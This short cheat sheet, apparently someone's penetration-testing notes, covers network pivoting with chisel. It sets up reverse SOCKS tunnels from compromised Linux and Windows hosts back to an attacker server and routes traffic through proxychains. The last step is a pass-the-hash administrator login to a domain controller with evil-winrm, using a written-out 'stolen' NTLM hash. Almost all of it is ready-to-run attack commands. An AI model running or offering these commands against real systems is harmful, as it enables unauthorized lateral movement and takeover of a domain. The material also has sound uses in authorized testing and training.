# Reference: https://ap3x.github.io/posts/pivoting-with-chisel/

## Attacker Server
./chisel_1.9.1_linux_amd64 server -p 4444 --reverse

## Machine 1 (Linux)
chisel client 192.168.1.72 4444 --reverse R:socks:1080
vi /etc/proxychains4.conf # Change socks and port to match socks port.

## Machine 1 (Windows)
.\chisel.exe client 192.168.45.185:4444 R:socks

## Attacker Machine
proxychains ssh

## Attacker Remote Connection to DC01 with stolen NTLM hash
proxychains evil-winrm -i 10.10.83.152 -u administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
